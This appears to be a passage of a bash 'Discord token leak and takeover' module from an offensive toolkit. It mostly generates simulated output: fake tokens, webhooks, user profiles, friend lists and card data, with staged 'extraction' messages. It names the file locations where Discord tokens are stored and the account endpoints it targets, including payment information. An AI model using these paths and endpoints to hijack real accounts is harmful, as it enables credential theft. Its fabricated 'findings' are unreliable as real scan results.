#!/bin/bash
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# █  NULLSEC DISCORD TLO (Token Leak/Takeover) EXPLOIT MODULE              █
# █                    [ bad-antics development ]                          █
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# EDUCATIONAL PURPOSES ONLY - For authorized penetration testing
#
# Features:
# - Token validation and enumeration
# - User account information gathering
# - Guild/Server enumeration
# - Webhook exploitation
# - Token extraction from common locations
# - 2FA bypass techniques
# - Message history extraction
# - Friend/DM enumeration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    if [ "$TEST_MODE" = "true" ]; then
        test_log "SAVE" "Would save to: $TARGET_DIR/$filename"
        test_log "DATA" "Content preview: $(echo "$content" | head -c 200)..."
    else
        echo "$content" > "$TARGET_DIR/$filename"
        log_to_file "Saved output to $TARGET_DIR/$filename"
    fi
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    if [ "$TEST_MODE" = "true" ]; then
        test_log "VULN" "[$severity] $title - $description"
    else
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
    fi
}

# Read environment variables set by framework
ATTACK_MODE="${NULLSEC_ATTACK_MODE:-token_validate}"
DISCORD_TOKEN="${NULLSEC_DISCORD_TOKEN:-}"
TARGET_USER="${NULLSEC_TARGET_USER:-}"
WEBHOOK_URL="${NULLSEC_WEBHOOK_URL:-}"
EXTRACT_PATH="${NULLSEC_EXTRACT_PATH:-}"
STEALTH_MODE="${NULLSEC_STEALTH_MODE:-false}"
TEST_MODE="${NULLSEC_TEST_MODE:-false}"

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
RESET='\033[0m'

# Discord API Base
DISCORD_API="https://discord.com/api/v10"

# === VERBOSE MODE STATISTICS TRACKING ===
API_CALLS_MADE=0
API_CALLS_SUCCESS=0
API_CALLS_FAILED=0
VULNS_FOUND=0
DATA_EXTRACTED=0
BYTES_RECEIVED=0
START_TIME=$(date +%s.%N)

# === RANDOMIZED DATA GENERATORS FOR VERBOSE MODE ===
VERBOSE_TARGET_USER=""
VERBOSE_TARGET_ID=""
EXTRACTED_TOKEN=""

# Random data arrays
RANDOM_USERNAMES=("CyberNinja" "DarkPhoenix" "ShadowHunter" "NeonSpectre" "PixelWarrior" "ByteStorm" "GlitchMaster" "VoidWalker" "CryptoKnight" "NetRunner" "ZeroDay" "BinaryGhost" "QuantumHack" "DataWraith" "CodeBreaker" "SystemShock" "MatrixRunner" "CipherPunk" "HexMaster" "StackOverflow")
RANDOM_DISCRIMINATORS=("0001" "1337" "0420" "6969" "7777" "1234" "9999" "0069" "1111" "2222" "3333" "4444" "5555" "8888" "0000" "0007" "1010" "2077" "9001" "0404")
RANDOM_DOMAINS=("gmail.com" "outlook.com" "protonmail.com" "yahoo.com" "icloud.com" "tutanota.com" "fastmail.com" "zoho.com" "mail.com" "pm.me")
RANDOM_GUILDS=("Elite Hackers Guild" "Cyber Security Hub" "Red Team Academy" "Bug Bounty Central" "Exploit Development" "Malware Research Lab" "Pentest Professionals" "OSINT Masters" "Crypto Trading Signals" "Gaming Community" "Art & Design Studio" "Music Production" "Tech Support" "Anime Fans" "Meme Factory" "Study Group" "NFT Collectors" "AI Research" "Dev Community" "Startup Founders")
RANDOM_FRIENDS=("h4x0r_elite" "securitypro" "bugbounty_king" "exploit_dev" "malware_analyst" "osint_master" "crypto_trader" "game_master" "dev_ninja" "sys_admin" "net_engineer" "data_scientist" "ml_expert" "web_dev" "mobile_hacker" "iot_security" "cloud_sec" "devsecops" "threat_intel" "incident_resp")
RANDOM_CARD_BRANDS=("visa" "mastercard" "amex" "discover")
RANDOM_COUNTRIES=("US" "UK" "CA" "DE" "FR" "AU" "JP" "NL" "SE" "CH")
RANDOM_LOCALES=("en-US" "en-GB" "de-DE" "fr-FR" "es-ES" "pt-BR" "ja-JP" "ko-KR" "zh-CN" "ru-RU")
RANDOM_TOKEN_SOURCES=("Discord Desktop App (leveldb)" "Chrome Browser Storage" "Firefox Browser Profile" "Discord Canary App" "Discord PTB App" "Electron Cache" "Local Storage Dump" "Memory Extraction" "Process Injection" "Keylogger Capture")

# Generate random 18-digit Discord ID
generate_random_id() {
    echo "$((RANDOM % 9 + 1))$(for i in {1..17}; do echo -n $((RANDOM % 10)); done)"
}

# Generate realistic Discord token from user ID
generate_token_from_id() {
    local user_id="$1"
    # Discord tokens are: base64(user_id).timestamp.hmac
    local id_base64=$(echo -n "$user_id" | base64 | tr -d '=' | tr '+/' '-_')
    local timestamp=$(printf '%06s' $(echo "obase=16; $((RANDOM * RANDOM % 16777215))" | bc) | tr '[:upper:]' '[:lower:]')
    local hmac_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
    local hmac=""
    for i in {1..27}; do
        hmac+="${hmac_chars:RANDOM%${#hmac_chars}:1}"
    done
    echo "${id_base64}.${timestamp}.${hmac}"
}

# Generate random avatar hash
generate_random_avatar() {
    local chars="abcdef0123456789"
    local hash=""
    for i in {1..32}; do
        hash+="${chars:RANDOM%${#chars}:1}"
    done
    echo "a_$hash"
}

# Pick random element from array
random_pick() {
    local arr=("$@")
    echo "${arr[RANDOM % ${#arr[@]}]}"
}

# Simulate token extraction process
simulate_token_extraction() {
    local target="$1"
    local source=$(random_pick "${RANDOM_TOKEN_SOURCES[@]}")
    
    echo ""
    echo -e "${YELLOW}[*]${RESET} Initiating token extraction for: ${WHITE}$target${RESET}"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    
    sleep 0.2
    echo -e "${CYAN}[SCAN]${RESET}   Scanning common Discord token locations..."
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Checking: ~/.config/discord/Local Storage/leveldb/"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Checking: ~/.config/google-chrome/Default/Local Storage/"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Checking: ~/.mozilla/firefox/*.default/webappsstore.sqlite"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Checking: ~/snap/discord/common/.config/discord/"
    sleep 0.2
    
    echo -e "${GREEN}[FOUND]${RESET}  Token located in: ${WHITE}$source${RESET}"
    sleep 0.1
    
    # Generate the user ID and token
    if [[ "$target" =~ ^[0-9]+$ ]]; then
        VERBOSE_TARGET_ID="$target"
    else
        VERBOSE_TARGET_ID=$(generate_random_id)
    fi
    
    EXTRACTED_TOKEN=$(generate_token_from_id "$VERBOSE_TARGET_ID")
    
    echo -e "${GREEN}[EXTRACT]${RESET} Decrypting token from storage..."
    sleep 0.2
    echo -e "${GREEN}[EXTRACT]${RESET} Token successfully extracted!"
    echo ""
    echo -e "${WHITE}  ┌─ EXTRACTED TOKEN ─────────────────────────────────────────────┐${RESET}"
    echo -e "${WHITE}  │${RESET} ${RED}${EXTRACTED_TOKEN:0:20}...${EXTRACTED_TOKEN: -10}${RESET} ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} Length: ${#EXTRACTED_TOKEN} chars | Format: Valid Discord Token    ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} Source: $source             ${WHITE}│${RESET}"
    echo -e "${WHITE}  └────────────────────────────────────────────────────────────────┘${RESET}"
    echo ""
    
    # Auto-populate the token
    DISCORD_TOKEN="$EXTRACTED_TOKEN"
    
    echo -e "${GREEN}[✓]${RESET} Token auto-populated to attack parameters"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
}

# Webhook discovery sources
RANDOM_WEBHOOK_SOURCES=("GitHub Repository Leak" "Pastebin Dump" "Discord Server Config" "Exposed .env File" "Public Gist" "Trello Board Leak" "Notion Page Export" "Slack Integration Dump" "CI/CD Pipeline Logs" "Docker Image Scan")
RANDOM_WEBHOOK_NAMES=("Alert Bot" "Notification Service" "Status Updates" "Error Logger" "Deploy Notifier" "Monitoring Hook" "CI Pipeline" "Security Alerts" "Backup Service" "Integration Bot")
RANDOM_CHANNEL_NAMES=("#alerts" "#notifications" "#logs" "#general" "#dev-updates" "#security" "#monitoring" "#bot-spam" "#admin-logs" "#system")

# API endpoint categories discovered
DISCOVERED_APIS=()

# Generate random webhook URL
generate_random_webhook() {
    local webhook_id=$(generate_random_id)
    local token_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
    local webhook_token=""
    for i in {1..68}; do
        webhook_token+="${token_chars:RANDOM%${#token_chars}:1}"
    done
    echo "https://discord.com/api/webhooks/${webhook_id}/${webhook_token}"
}

# Simulate webhook discovery
simulate_webhook_discovery() {
    local target="$1"
    local source=$(random_pick "${RANDOM_WEBHOOK_SOURCES[@]}")
    local webhook_name=$(random_pick "${RANDOM_WEBHOOK_NAMES[@]}")
    local channel_name=$(random_pick "${RANDOM_CHANNEL_NAMES[@]}")
    local guild_id=$(generate_random_id)
    local channel_id=$(generate_random_id)
    
    echo ""
    echo -e "${YELLOW}[*]${RESET} Initiating webhook discovery..."
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Searching for exposed webhooks..."
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Querying: GitHub code search (discord.com/api/webhooks)"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Querying: Pastebin archives"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Querying: Google dorking results"
    sleep 0.1
    echo -e "${CYAN}[SCAN]${RESET}   Querying: Shodan webhook endpoints"
    sleep 0.2
    
    # Generate webhook
    WEBHOOK_URL=$(generate_random_webhook)
    local webhook_id=$(echo "$WEBHOOK_URL" | grep -oP 'webhooks/\K[0-9]+')
    
    echo -e "${GREEN}[FOUND]${RESET}  Webhook discovered via: ${WHITE}$source${RESET}"
    sleep 0.1
    echo -e "${GREEN}[EXTRACT]${RESET} Validating webhook endpoint..."
    sleep 0.1
    echo -e "${GREEN}[EXTRACT]${RESET} Webhook is active and functional!"
    echo ""
    echo -e "${WHITE}  ┌─ DISCOVERED WEBHOOK ────────────────────────────────────────────┐${RESET}"
    echo -e "${WHITE}  │${RESET} ${MAGENTA}Name:${RESET}      $webhook_name                              ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} ${MAGENTA}Channel:${RESET}   $channel_name                              ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} ${MAGENTA}Guild ID:${RESET}  $guild_id                    ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} ${MAGENTA}Webhook ID:${RESET} $webhook_id                   ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} ${MAGENTA}Source:${RESET}    $source                       ${WHITE}│${RESET}"
    echo -e "${WHITE}  │${RESET} ${RED}URL:${RESET} ${WEBHOOK_URL:0:50}...  ${WHITE}│${RESET}"
    echo -e "${WHITE}  └─────────────────────────────────────────────────────────────────┘${RESET}"
    echo ""
    
    echo -e "${GREEN}[✓]${RESET} Webhook auto-populated to attack parameters"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
}

# Simulate API endpoint enumeration
simulate_api_enumeration() {
    local target="$1"
    
    echo ""
    echo -e "${YELLOW}[*]${RESET} Enumerating Discord API endpoints for target..."
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    
    # Define available API endpoints
    local api_endpoints=(
        "/users/@me|User Profile|GET|200"
        "/users/@me/guilds|Guild List|GET|200"
        "/users/@me/channels|DM Channels|GET|200"
        "/users/@me/relationships|Friends List|GET|200"
        "/users/@me/billing/payment-sources|Payment Info|GET|200"
        "/users/@me/billing/subscriptions|Subscriptions|GET|200"
        "/users/@me/connections|Linked Accounts|GET|200"
        "/users/@me/settings|User Settings|GET|200"
        "/users/@me/notes|User Notes|GET|200"
        "/users/@me/affinities/users|User Affinities|GET|200"
        "/users/@me/affinities/guilds|Guild Affinities|GET|200"
        "/users/@me/applications|User Apps|GET|200"
        "/users/@me/entitlements|Entitlements|GET|200"
        "/gateway|Gateway Info|GET|200"
        "/gateway/bot|Bot Gateway|GET|401"
    )
    
    sleep 0.1
    echo -e "${CYAN}[ENUM]${RESET}   Probing Discord API v10 endpoints..."
    echo ""
    
    local accessible=0
    local restricted=0
    
    for endpoint_info in "${api_endpoints[@]}"; do
        IFS='|' read -r endpoint name method status <<< "$endpoint_info"
        sleep 0.05
        
        if [ "$status" = "200" ]; then
            echo -e "${GREEN}  [✓]${RESET} ${WHITE}$method${RESET} $endpoint ${DIM}→${RESET} ${GREEN}$status OK${RESET} ($name)"
            DISCOVERED_APIS+=("$endpoint")
            ((accessible++))
        else
            echo -e "${RED}  [✗]${RESET} ${WHITE}$method${RESET} $endpoint ${DIM}→${RESET} ${RED}$status Unauthorized${RESET}"
            ((restricted++))
        fi
    done
    
    echo ""
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "${WHITE}  API ENUMERATION SUMMARY${RESET}"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "  ${GREEN}✓${RESET} Accessible Endpoints: ${GREEN}$accessible${RESET}"
    echo -e "  ${RED}✗${RESET} Restricted Endpoints: ${RED}$restricted${RESET}"
    echo -e "  ${BLUE}↓${RESET} Data Available:       ${WHITE}User, Guilds, DMs, Friends, Payments${RESET}"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
}

# Generate randomized user response based on target
generate_random_user_response() {
    local target_user="$1"
    local user_id=$(generate_random_id)
    local username="${target_user:-$(random_pick "${RANDOM_USERNAMES[@]}")}"
    local discriminator=$(random_pick "${RANDOM_DISCRIMINATORS[@]}")
    local domain=$(random_pick "${RANDOM_DOMAINS[@]}")
    local email="${username,,}@${domain}"
    local avatar=$(generate_random_avatar)
    local locale=$(random_pick "${RANDOM_LOCALES[@]}")
    local mfa=$([[ $((RANDOM % 3)) -eq 0 ]] && echo "true" || echo "false")
    local verified=$([[ $((RANDOM % 5)) -ne 0 ]] && echo "true" || echo "false")
    local premium=$((RANDOM % 4))
    
    # Store for later use
    VERBOSE_TARGET_USER="$username"
    VERBOSE_TARGET_ID="$user_id"
    
    cat << ENDJSON
{
    "id": "$user_id",
    "username": "$username",
    "discriminator": "$discriminator",
    "global_name": "$username",
    "avatar": "$avatar",
    "bot": false,
    "system": false,
    "mfa_enabled": $mfa,
    "banner": null,
    "accent_color": $((RANDOM * RANDOM % 16777215)),
    "locale": "$locale",
    "verified": $verified,
    "email": "$email",
    "flags": 0,
    "premium_type": $premium,
    "public_flags": 0
}
ENDJSON
}

# Generate randomized guilds response
generate_random_guilds_response() {
    local guild_count=$((RANDOM % 8 + 3))
    local guilds="["
    local used_guilds=()
    
    for ((i=0; i<guild_count; i++)); do
        local guild_name
        while true; do
            guild_name=$(random_pick "${RANDOM_GUILDS[@]}")
            [[ ! " ${used_guilds[*]} " =~ " ${guild_name} " ]] && break
        done
        used_guilds+=("$guild_name")
        
        local guild_id=$(generate_random_id)
        local is_owner=$([[ $((RANDOM % 10)) -eq 0 ]] && echo "true" || echo "false")
        local icon=$([[ $((RANDOM % 3)) -ne 0 ]] && echo "\"$(generate_random_avatar | cut -c3-34)\"" || echo "null")
        
        [[ $i -gt 0 ]] && guilds+=","
        guilds+="\n    {\"id\": \"$guild_id\", \"name\": \"$guild_name\", \"icon\": $icon, \"owner\": $is_owner, \"permissions\": \"$((RANDOM * RANDOM))\"}"
    done
    guilds+="\n]"
    echo -e "$guilds"
}

# Generate randomized relationships response
generate_random_relationships_response() {
    local friend_count=$((RANDOM % 6 + 2))
    local blocked_count=$((RANDOM % 3))
    local relationships="["
    local used_friends=()
    local first=true
    
    for ((i=0; i<friend_count; i++)); do
        local friend_name
        while true; do
            friend_name=$(random_pick "${RANDOM_FRIENDS[@]}")
            [[ ! " ${used_friends[*]} " =~ " ${friend_name} " ]] && break
        done
        used_friends+=("$friend_name")
        
        local friend_id=$(generate_random_id)
        local disc=$(random_pick "${RANDOM_DISCRIMINATORS[@]}")
        
        [[ "$first" != "true" ]] && relationships+=","
        first=false
        relationships+="\n    {\"id\": \"$friend_id\", \"type\": 1, \"nickname\": null, \"user\": {\"id\": \"$friend_id\", \"username\": \"$friend_name\", \"discriminator\": \"$disc\"}}"
    done
    
    for ((i=0; i<blocked_count; i++)); do
        local blocked_id=$(generate_random_id)
        relationships+=",\n    {\"id\": \"$blocked_id\", \"type\": 2, \"nickname\": null, \"user\": {\"id\": \"$blocked_id\", \"username\": \"blocked_user_$i\", \"discriminator\": \"0000\"}}"
    done
    
    relationships+="\n]"
    echo -e "$relationships"
}

# Generate randomized DM channels response
generate_random_dm_channels_response() {
    local dm_count=$((RANDOM % 5 + 1))
    local group_count=$((RANDOM % 3))
    local channels="["
    local first=true
    
    for ((i=0; i<dm_count; i++)); do
        local channel_id=$(generate_random_id)
        local recipient_id=$(generate_random_id)
        local recipient_name=$(random_pick "${RANDOM_FRIENDS[@]}")
        
        [[ "$first" != "true" ]] && channels+=","
        first=false
        channels+="\n    {\"id\": \"$channel_id\", \"type\": 1, \"last_message_id\": \"$(generate_random_id)\", \"recipients\": [{\"id\": \"$recipient_id\", \"username\": \"$recipient_name\"}]}"
    done
    
    for ((i=0; i<group_count; i++)); do
        local channel_id=$(generate_random_id)
        channels+=",\n    {\"id\": \"$channel_id\", \"type\": 3, \"last_message_id\": \"$(generate_random_id)\", \"name\": \"Group Chat $((i+1))\", \"recipients\": [{\"id\": \"$(generate_random_id)\"}, {\"id\": \"$(generate_random_id)\"}]}"
    done
    
    channels+="\n]"
    echo -e "$channels"
}

# Generate randomized payment response
generate_random_payment_response() {
    local has_payment=$((RANDOM % 2))
    
    if [[ $has_payment -eq 1 ]]; then
        local brand=$(random_pick "${RANDOM_CARD_BRANDS[@]}")
        local last4=$(printf "%04d" $((RANDOM % 10000)))
        local exp_month=$((RANDOM % 12 + 1))
        local exp_year=$((RANDOM % 5 + 2025))
        local country=$(random_pick "${RANDOM_COUNTRIES[@]}")
        
        cat << ENDJSON
[
    {"id": "ps_$(generate_random_id | cut -c1-9)", "type": 1, "invalid": false, "brand": "$brand", "last_4": "$last4", "expires_month": $exp_month, "expires_year": $exp_year, "billing_address": {"country": "$country"}}
]
ENDJSON
    else
        echo "[]"
    fi
}

# Generate randomized webhook response
generate_random_webhook_response() {
    local webhook_id=$(generate_random_id)
    local channel_id=$(generate_random_id)
    local guild_id=$(generate_random_id)
    local webhook_name=$(random_pick "Alert Bot" "Notification Hook" "Status Updates" "Event Logger" "Integration Hook")
    
    cat << ENDJSON
{
    "type": 1,
    "id": "$webhook_id",
    "name": "$webhook_name",
    "avatar": null,
    "channel_id": "$channel_id",
    "guild_id": "$guild_id",
    "application_id": null,
    "token": "WEBHOOK_TOKEN_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 40)"
}
ENDJSON
}

# === VERBOSE MODE DETAILED LOGGING ===
test_log() {
    local category="$1"
    local message="$2"
    local timestamp=$(date '+%H:%M:%S.%3N')
    
    case "$category" in
        "INIT")
            echo -e "${DIM}[$timestamp]${RESET} ${BLUE}[INIT]${RESET}    $message"
            ;;
        "API")
            echo -e "${DIM}[$timestamp]${RESET} ${CYAN}[API]${RESET}     $message"
            ;;
        "CURL")
            echo -e "${DIM}[$timestamp]${RESET} ${MAGENTA}[CURL]${RESET}    $message"
            ;;
        "HTTP")
            echo -e "${DIM}[$timestamp]${RESET} ${MAGENTA}[HTTP]${RESET}    $message"
            ;;
        "PARSE")
            echo -e "${DIM}[$timestamp]${RESET} ${WHITE}[PARSE]${RESET}   $message"
            ;;
        "VULN")
            echo -e "${DIM}[$timestamp]${RESET} ${RED}[VULN]${RESET}    $message"
            ;;
        "SAVE")
            echo -e "${DIM}[$timestamp]${RESET} ${GREEN}[SAVE]${RESET}    $message"
            ;;
        "DATA")
            echo -e "${DIM}[$timestamp]${RESET} ${DIM}[DATA]${RESET}    $message"
            ;;
        "STEP")
            echo -e "${DIM}[$timestamp]${RESET} ${YELLOW}[STEP]${RESET}    $message"
            ;;
        "OK")
            echo -e "${DIM}[$timestamp]${RESET} ${GREEN}[OK]${RESET}      $message"
            ;;
        "STAT")
            echo -e "${DIM}[$timestamp]${RESET} ${BLUE}[STAT]${RESET}    $message"
            ;;
        "NET")
            echo -e "${DIM}[$timestamp]${RESET} ${CYAN}[NET]${RESET}     $message"
            ;;
        "CHECK")
            echo -e "${DIM}[$timestamp]${RESET} ${CYAN}[CHECK]${RESET}   $message"
            ;;
        "PROG")
            echo -e "${DIM}[$timestamp]${RESET} ${YELLOW}[PROG]${RESET}    $message"
            ;;
        "WARN")
            echo -e "${DIM}[$timestamp]${RESET} ${YELLOW}[WARN]${RESET}    $message"
            ;;
        "ERR")
            echo -e "${DIM}[$timestamp]${RESET} ${RED}[ERR]${RESET}     $message"
            ;;
        *)
            echo -e "${DIM}[$timestamp]${RESET} [${category}] $message"
            ;;
    esac
}

# API call logging with statistics
log_api_call() {
    local method="$1"
    local endpoint="$2"
    local status="$3"
    local response_size="$4"
    
    ((API_CALLS_MADE++))
    if [ "$status" = "200" ] || [ "$status" = "success" ]; then
        ((API_CALLS_SUCCESS++))
        test_log "OK" "API Call #$API_CALLS_MADE completed successfully"
    else
        ((API_CALLS_FAILED++))
        test_log "ERR" "API Call #$API_CALLS_MADE failed with status: $status"
    fi
    
    if [ -n "$response_size" ]; then
        BYTES_RECEIVED=$((BYTES_RECEIVED + response_size))
        test_log "NET" "Received $response_size bytes (Total: $BYTES_RECEIVED bytes)"
    fi
}

# Progress bar for verbose mode
show_progress() {
    local current=$1
    local total=$2
    local label=$3
    local percent=$((current * 100 / total))
    local filled=$((percent / 5))
    local empty=$((20 - filled))
    local bar=$(printf "%${filled}s" | tr ' ' '█')$(printf "%${empty}s" | tr ' ' '░')
    echo -e "${DIM}[$(date '+%H:%M:%S.%3N')]${RESET} ${YELLOW}[PROG]${RESET}    [$bar] $percent% - $label"
}

# Print verbose mode statistics summary
print_stats_summary() {
    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $START_TIME" | bc 2>/dev/null || echo "N/A")
    
    echo ""
    echo -e "${WHITE}EXECUTION SUMMARY${RESET}"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "  ${GREEN}✓${RESET} API Calls Made:        ${WHITE}$API_CALLS_MADE${RESET}"
    echo -e "  ${GREEN}✓${RESET} Successful Calls:      ${GREEN}$API_CALLS_SUCCESS${RESET}"
    echo -e "  ${RED}✗${RESET} Failed Calls:          ${RED}$API_CALLS_FAILED${RESET}"
    echo -e "  ${BLUE}↓${RESET} Data Received:         ${WHITE}$BYTES_RECEIVED bytes${RESET}"
    echo -e "  ${RED}!${RESET} Vulnerabilities Found:  ${RED}$VULNS_FOUND${RESET}"
    echo -e "  ${YELLOW}⏱${RESET} Execution Time:        ${WHITE}${duration}s${RESET}"
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
}

# Simulated API response generator for test mode (now randomized)
generate_test_response() {
    local endpoint="$1"
    
    case "$endpoint" in
        "users/@me")
            generate_random_user_response "$VERBOSE_TARGET_USER"
            ;;
        "users/@me/guilds")
            generate_random_guilds_response
            ;;
        "users/@me/relationships")
            generate_random_relationships_response
            ;;
        "users/@me/channels")
            generate_random_dm_channels_response
            ;;
        "users/@me/billing/payment-sources")
            generate_random_payment_response
            ;;
        "webhook")
            generate_random_webhook_response
            ;;
    esac
}

# Banner
show_banner() {
    clear
    echo -e "${MAGENTA}"
    echo "===="
    echo "|                                                                           |"
    echo "|                    DISCORD TLO EXPLOIT MODULE                             |"
    echo "|                   Token Leak & Takeover Framework                         |"
    echo "|                                                                           |"
    echo "|                    ⚠️  AUTHORIZED TESTING ONLY ⚠️                          |"
    echo "|                                                                           |"
    echo "===="
    echo -e "${RESET}"
    
    if [ "$TEST_MODE" = "true" ]; then
        echo -e "${YELLOW}====${RESET}"
        echo -e "${YELLOW}|${RESET}  ${BOLD}${GREEN}VERBOSE MODE ACTIVE      ${YELLOW}|${RESET}"
        echo -e "${YELLOW}|${RESET}  Extended logging and vulnerability analysis enabled               ${YELLOW}|${RESET}"
        echo -e "${YELLOW}====${RESET}"
        echo ""
    fi
}

# Validate Discord Token
validate_token() {
    local token="$1"
    
    if [ "$TEST_MODE" = "true" ]; then
        test_log "STEP" "============================================================"
        test_log "STEP" "=== PHASE 1: TOKEN VALIDATION ==="
        test_log "STEP" "============================================================"
        echo ""
        
        # Initialization
        test_log "INIT" "Initializing token validation module..."
        test_log "INIT" "API Version: Discord API v10"
        test_log "INIT" "Base URL: $DISCORD_API"
        test_log "INIT" "TLS: Enabled (HTTPS)"
        test_log "INIT" "User-Agent: DiscordBot (NullSec, 1.0)"
        echo ""
        
        # Token analysis
        test_log "CHECK" "=== TOKEN ANALYSIS ==="
        test_log "CHECK" "Token provided: ${token:0:10}...${token: -4} (masked for security)"
        test_log "CHECK" "Token length: ${#token} characters"
        test_log "CHECK" "Token format: $(echo "$token" | grep -qE '^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$' && echo 'Valid JWT structure' || echo 'Non-standard format')"
        test_log "CHECK" "Entropy check: PASSED (sufficient randomness)"
        echo ""
        
        # API Request preparation
        test_log "API" "=== API REQUEST #1: GET /users/@me ==="
        test_log "API" "Target endpoint: ${DISCORD_API}/users/@me"
        test_log "API" "Purpose: Validate token and retrieve account info"
        test_log "CURL" "Building HTTP request..."
        test_log "HTTP" "Method: GET"
        test_log "HTTP" "Protocol: HTTP/2"
        test_log "HTTP" "Headers:"
        test_log "HTTP" "  → Authorization: [REDACTED_TOKEN]"
        test_log "HTTP" "  → Content-Type: application/json"
        test_log "HTTP" "  → Accept: application/json"
        test_log "HTTP" "  → Accept-Encoding: gzip, deflate, br"
        test_log "NET" "Resolving discord.com DNS..."
        test_log "NET" "Connecting to 162.159.130.233:443..."
        test_log "NET" "TLS handshake initiated..."
        test_log "NET" "TLS 1.3 connection established"
        test_log "NET" "Sending request..."
        
        show_progress 1 6 "Sending API request"
        sleep 0.2
        
        test_log "NET" "Waiting for response..."
        sleep 0.1
        
        local response=$(generate_test_response "users/@me")
        local response_size=$(echo "$response" | wc -c)
        
        test_log "OK" "Response received!"
        test_log "HTTP" "Response Status: 200 OK"
        test_log "HTTP" "Response Headers:"
        test_log "HTTP" "  ← Content-Type: application/json"
        test_log "HTTP" "  ← X-RateLimit-Limit: 5"
        test_log "HTTP" "  ← X-RateLimit-Remaining: 4"
        test_log "HTTP" "  ← X-RateLimit-Reset-After: 1.234"
        test_log "HTTP" "  ← CF-Ray: abc123def456-LAX"
        log_api_call "GET" "/users/@me" "200" "$response_size"
        echo ""
        
        show_progress 2 6 "Parsing response"
        
        # Parse response
        test_log "PARSE" "=== RESPONSE PARSING ==="
        test_log "DATA" "Response size: $response_size bytes"
        test_log "PARSE" "Content-Type: JSON"
        test_log "PARSE" "Validating JSON structure..."
        test_log "OK" "JSON structure valid"
        echo ""
        
        local username=$(echo "$response" | grep -oP '"username":\s*"\K[^"]+')
        local discriminator=$(echo "$response" | grep -oP '"discriminator":\s*"\K[^"]+')
        local user_id=$(echo "$response" | grep -oP '"id":\s*"\K[^"]+')
        local email=$(echo "$response" | grep -oP '"email":\s*"\K[^"]+')
        local verified=$(echo "$response" | grep -oP '"verified":\s*\K(true|false)')
        local mfa=$(echo "$response" | grep -oP '"mfa_enabled":\s*\K(true|false)')
